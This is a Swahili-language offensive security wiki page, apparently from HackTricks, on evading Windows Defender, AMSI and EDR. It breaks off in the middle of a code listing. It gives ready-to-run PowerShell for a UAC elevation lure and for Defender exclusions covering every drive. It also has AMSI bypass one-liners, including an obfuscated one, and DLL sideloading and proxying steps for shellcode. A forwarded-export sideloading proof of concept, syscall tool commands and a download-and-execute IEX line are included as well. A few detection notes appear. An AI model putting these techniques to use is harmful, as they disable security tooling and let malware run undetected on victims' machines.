# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya kuwa AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Chambo cha UAC cha mtindo wa installer kabla ya kuingilia Defender

Loaders za umma zinazojifanya kuwa cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe zisizosainiwa, ambazo kwanza **humwomba mtumiaji ruhusa za juu** na kisha kudhoofisha Defender. Mchakato ni rahisi:

1. Kagua kama kuna muktadha wa admin kwa kutumia `net session`. Amri hiyo hufaulu tu wakati mtumiaji ana haki za admin, kwa hiyo ikishindwa inaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe tena mara moja kwa kutumia verb ya `RunAs` ili kuanzisha kidokezo cha kawaida cha idhini ya UAC huku ukihifadhi command line ya awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha programu “cracked”, kwa hivyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa inayohitaji kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` za jumla kwa kila herufi ya drive

Baada ya kupata ruhusa za juu, misururu ya aina ya GachiLoader huongeza maeneo ambayo Defender haiwezi kukagua badala ya kuzima huduma kabisa. Kwanza loader huua watchdog ya GUI (`taskkill /F /IM SecHealthUI.exe`), kisha huweka **exclusions pana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kukaguliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Mzunguko hupitia kila filesystem iliyowekwa (D:\, E:\, USB sticks, n.k.), kwa hivyo **payload yoyote itakayowekwa popote kwenye diski baadaye hupuuzwa**.
- Kutenga kiendelezi cha `.sys` ni hatua ya kujiandaa kwa siku zijazo—washambuliaji huhifadhi chaguo la kupakia drivers ambazo hazijasainiwa baadaye bila kuigusa tena Defender.
- Mabadiliko yote huwekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuziongeza bila kuanzisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayosimamishwa, ukaguzi rahisi wa hali huendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati halisi haukagui kamwe njia hizo.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Kwa sasa, AV hutumia mbinu tofauti kuangalia kama faili ni hasidi au la: utambuzi tuli, uchanganuzi wa nguvu, na kwa EDR za kiwango cha juu zaidi, uchanganuzi wa kitabia.

### **Utambuzi tuli**

Utambuzi tuli hufanywa kwa kuripoti strings au safu za byte hasidi zinazojulikana ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (k.m. maelezo ya faili, jina la kampuni, sahihi za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kuripotiwa kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya utambuzi:

- **Usimbaji fiche**

Ukisimba binary kwa fiche, AV haitaweza kutambua programu yako, lakini utahitaji aina fulani ya loader ili kufungua usimbaji fiche na kuendesha programu kwenye memory.

- **Uficheaji wa msimbo**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hili linaweza kuchukua muda kulingana na unachojaribu kuficha.

- **Utengenezaji wa zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures hasidi zinazojulikana, lakini hili linahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kujaribu dhidi ya utambuzi tuli wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya faili katika sehemu nyingi kisha kuiomba Defender ichanganue kila sehemu kivyake; kwa njia hii, inaweza kukuonyesha hasa strings au bytes zilizoripotiwa ndani ya binary yako.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion kwa vitendo.

### Majaribio ya vipengele vya PE nje ya mtandao kwa viainishaji tuli

Byte za payload zilizopakiwa au kusimbwa kwa fiche ni ingizo moja tu kwa kiainishaji tuli. EMBER2024 hutoa vipengele vya PE, vikiwemo imports, exports, sections, headers, na data ya Authenticode.<sup>[[48]](#references)</sup> Katika jaribio moja la loader, kuongeza imports 141 zilizofanana na zisizo hasidi kulipunguza alama ya uhasidi ya EMBER2024 kwa 93%, huku imports zinazohusishwa na malware zikiiongeza. Haya ni matokeo ya modeli hiyo na sampuli hizo, si njia ya kuaminika ya kukwepa bidhaa fulani ya AV/EDR.<sup>[[50]](#references)</sup>

Kwa jaribio la loader lililoidhinishwa, dumisha payload na njia ya utekelezaji bila mabadiliko, badilisha kigezo kimoja tu cha build kwa kila toleo, kisha linganisha alama nje ya mtandao. Kagua vipengele vya PE vinavyotokana na jaribio, kwa kuwa mabadiliko ya build yanaweza kuathiri zaidi ya kundi moja la vipengele.<sup>[[49]](#references)[[50]](#references)</sup> Ili kuweka imports zilizokusudiwa kwenye IAT, ita Win32 APIs zilizochaguliwa kutoka kwenye code inayoweza kufikiwa. Badilisha uteuzi na sambaza sehemu za miito katika builds tofauti badala ya kuunda function ya kuficha msimbo isiyobadilika ambayo inaweza kuwa signature. Jaribio hilo pia liliripoti alama za chini zaidi kwa kutumia usainishaji halali wa code, entries za export, na functions nyingi zaidi zinazopanua `.pdata`; usainishaji batili ulikuwa na athari ndogo, na athari ya `.pdata` ilikuwa ndogo.<sup>[[50]](#references)</sup>

Package ya `thrember` hutoa utoaji wa vipengele na modeli za benchmark. Baada ya kuisakinisha, tumia `thrember.download_models("models")` ukiwa na directory ya `models` iliyopo, kisha endesha scorer kutoka kwenye directory yake ya mzazi: helper ya kupakua hubadilisha working directory ya sasa. PE classifier inaweza kupima directory ya builds bila kuziwasilisha kwenye huduma ya uchanganuzi:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Weka matoleo ya model na feature-extractor yakiwa thabiti wakati wa kulinganisha. Alama ya chini ya offline inaonyesha tu jinsi classifier hii inavyoitikia binary iliyobadilishwa; haithibitishi kukwepa behavioral analysis, emulation, au model tofauti ya vendor.<sup>[[49]](#references)[[50]](#references)</sup> Kwa [per-build polymorphism and outer-binary camouflage in virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), tazama execution model tofauti.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inaendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (kwa mfano, kujaribu kusimbua na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Kulala kabla ya utekelezaji** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa dynamic analysis ya AV. AV ina muda mfupi sana wa kuchanganua faili ili isikatize kazi ya mtumiaji, kwa hiyo kutumia muda mrefu wa kulala kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka muda huo wa kulala, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida sandboxes huwa na rasilimali chache sana (kwa mfano, < 2GB RAM), la sivyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu zaidi hapa, kwa mfano kukagua halijoto ya CPU au hata kasi ya feni; si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi mahususi kwa mashine** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na ile uliyobainisha. Isipolingana, unaweza kufanya programu yako itoke.

Imebainika kuwa jina la kompyuta la Microsoft Defender's Sandbox ni HAL9TH. Kwa hiyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla haijatekelezwa. Jina likilingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukwepa Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> channel ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ukitaka kudump LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti isiyojulikana sana ambayo pia hudump LSASS?

Huenda jibu sahihi ni la pili. Tukichukua mimikatz kama mfano, huenda ni mojawapo ya malware zinazotambuliwa zaidi na AVs na EDRs, au ndiyo inayotambuliwa zaidi. Ingawa project yenyewe ni nzuri sana, pia ni jinamizi kujaribu kuikwepa AVs, kwa hiyo tafuta tu njia mbadala za kufanikisha unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payloads zako ili kukwepa utambuzi, hakikisha **umezima automatic sample submission** kwenye defender, na tafadhali, kwa dhati, **USIUPLOAD KWA VIRUSTOTAL** ikiwa lengo lako ni kukwepa utambuzi kwa muda mrefu. Ukitaka kuangalia kama AV fulani inatambua payload yako, isakinishe kwenye VM, jaribu kuzima automatic sample submission, kisha ifanyie majaribio humo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, **kipaumbele kiwe kutumia DLLs ili kukwepa utambuzi**. Katika uzoefu wangu, faili za DLL kwa kawaida **hutambuliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo ni mbinu rahisi sana ya kuepuka utambuzi katika baadhi ya hali (ikiwa payload yako ina njia ya kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha utambuzi cha 4/26 kwenye antiscan.me, huku EXE payload ikiwa na kiwango cha utambuzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha mbinu unazoweza kutumia na faili za DLL ili kujificha zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka application ya mwathiriwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zinazoweza kushambuliwa kupitia DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kushambuliwa kupitia DLL Hijack/Sideload**, mbinu hii ni fiche sana ikifanywa ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa kuwa programu inatarajia baadhi ya function maalum ndani ya DLL hiyo. Ili kutatua hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza miito ambayo programu hufanya kutoka kwenye DLL ya proxy (na hasidi) kwenda kwenye DLL asilia, hivyo kuhifadhi utendakazi wa programu na kuweza kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupa faili 2: kiolezo cha msimbo chanzo wa DLL na DLL asilia iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema tumefaulu.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [twitch VOD ya S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading, na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), ili ujifunze zaidi kuhusu tuliyojadili kwa undani zaidi.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa hakika ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na mfuatano wa ASCII wenye muundo wa `TargetDll.TargetFunc`. Mtu anapoomba mfumo kutatua export hiyo, Windows loader:

- Hupakia `TargetDll` ikiwa bado haijapakiwa
- Hutafuta `TargetFunc` ndani yake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, itatolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa kutafuta DLL hutumika, ambao unajumuisha saraka ya moduli inayofanya uelekezaji huo.

Hii huwezesha mbinu isiyo ya moja kwa moja ya sideloading: tafuta DLL iliyosainiwa inayo-export function inayoelekezwa kwenye jina la moduli isiyo KnownDLL, kisha weka DLL hiyo iliyosainiwa pamoja na DLL inayodhibitiwa na mshambuliaji na yenye jina linalolingana kabisa na moduli lengwa iliyopitishwa. Forwarded export inapotumiwa, loader hutatua uelekezaji huo na kupakia DLL yako kutoka kwenye saraka hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hupatikana kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa kwenye folda inayoweza kuandikiwa ndiyo mwisho
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. `DllMain` ya msingi inatosha kutekeleza code; huhitaji kutekeleza function iliyoforwardiwa ili kuanzisha `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (iliyotiwa saini) hupakia `keyiso.dll` ya side-by-side (iliyotiwa saini)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kutekelezwa

Vidokezo vya kutafuta:
- Lenga exports zilizoforwardiwa ambapo moduli lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizoforwardiwa kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya ugunduzi/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLL zilizotiwa saini kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari kuhusu minyororo ya michakato/moduli kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikiwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na ukatae ruhusa za kuandika na kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana za payload za kukwepa EDRs kwa kutumia michakato iliyositishwa, direct syscalls na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuhamia kwenye kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za invocation:**
- **Direct (embedded)**: weka maagizo ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna `ntdll` export inayofikiwa).
- **Indirect**: ruka hadi kwenye syscall gadget iliyopo ndani ya `ntdll` ili mabadiliko ya kwenda kernel yaonekane kana kwamba yametoka `ntdll` (husaidia kukwepa heuristic); **randomized indirect** huchagua gadget kutoka kwenye kundi kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati wa runtime.

**Mikakati ya SSN resolution inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: weka `\KnownDlls\ntdll.dll` safi kwenye memory, soma SSN kutoka kwenye `.text` yake, kisha uiondoe (hupita hooks zote zilizo kwenye memory).
- **RecycledGate**: changanya makadirio ya SSN yaliyopangwa kwa VA na uthibitishaji wa opcode wakati stub iko safi; ikiwa imewekewa hook, tumia makadirio ya VA.
- **HW Breakpoint**: weka DR0 kwenye maagizo ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizo na hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AV ziliweza kuchanganua **faili zilizo kwenye diski** pekee, kwa hivyo kama ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye kumbukumbu**, AV isingeweza kuzuia hilo, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (kupandisha ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo wa dynamic)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Macros za Office VBA

Huruhusu suluhisho za antivirus kukagua tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujasimbwa wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutaleta tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Ona jinsi inavyoongeza `amsi:` na kisha njia ya executable ambayo script ilitekelezwa kutoka kwake; katika hali hii, powershell.exe

Hatukuacha faili yoyote kwenye diski, lakini bado tulinaswa kwenye kumbukumbu kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitishwa kupitia AMSI. Hii huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye kumbukumbu. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji kwenye kumbukumbu ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia utambuzi wa static, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa utambuzi.

Hata hivyo, AMSI ina uwezo wa kufichua scripts zilizoobfuscate hata zikiwa na tabaka nyingi, kwa hivyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya kukwepa kutokuwa jambo la moja kwa moja. Ingawa, wakati mwingine unachohitaji ni kubadilisha majina kadhaa ya variables na utakuwa sawa, kwa hivyo inategemea jinsi kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa za juu. Kwa sababu ya kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kukwepa uchanganuzi wa AMSI.

**Forcing an Error**

Kulazimisha uanzishaji wa AMSI kushindwa (amsiInitFailed) kutasababisha uchanganuzi kutoanzishwa kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ili kuzuia matumizi yake kuenea zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa code ya PowerShell ili kufanya AMSI isitumikie katika mchakato wa sasa wa PowerShell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, kwa hivyo unahitaji marekebisho fulani ili kutumia mbinu hii.

Hii hapa ni AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hili likagunduliwa mara tu chapisho hili litakapotolewa, kwa hivyo usichapishe code yoyote ikiwa mpango wako ni kutogundulika.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatakuwa 0, ambayo huchukuliwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumiwa kufanya bypass ya AMSI kwa powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuelekeza upya scan-pointer ya AMSI COM badala ya kufanya patching ya `AmsiScanBuffer`

Bypass nyingine inayohusu process ya ndani huacha entry point ya `AmsiScanBuffer` bila kuigusa. Katika .NET loader ya 64-bit iliyoripotiwa, object ya AMSI COM huundwa kutoka CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` hutoa interface pointer, na slot yake ya vtable kwenye offset `0x18` hutumiwa kama target ya scan-call. Loader hufanya patching ya native pointer ya `Console.Clear()` kwa kutumia x64 stub ndogo, hubadilisha ingizo hilo la vtable kuwa stub chini ya `VirtualProtect()`, kisha hurejesha ulinzi wa awali wa ukurasa. Upana wa pointer ya 64-bit na mpangilio wa COM unaotarajiwa ni masharti ya lazima; hii si offset ya jumla inayotumika kwa interfaces au builds zozote za AMSI. Hatua zilizotazamwa awali ni [upakiaji wa signed AppDomainManager sidecar](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) na [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Bytes za stub zilizotazamwa ni `41 C7 00 01 00 00 00 33 C0 C3`: huandika **1** kwenye result pointer katika `r8` na kurudisha **0** katika `eax`. Kwa hivyo, dai lililoripotiwa kwamba matokeo ya scan ni `AMSI_RESULT_CLEAN` (0) linachanganya thamani ya kurudi ya `S_OK` na enum ya matokeo. Katika mpangilio wa `AMSI_RESULT` ulioandikwa, matokeo **1** ni `AMSI_RESULT_NOT_DETECTED`; bado yapo chini ya kiwango cha ugunduzi.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Bypass thabiti isiyofungamana na lugha maalum ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` inayorudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakii kamwe na hakuna uchanganuzi unaofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

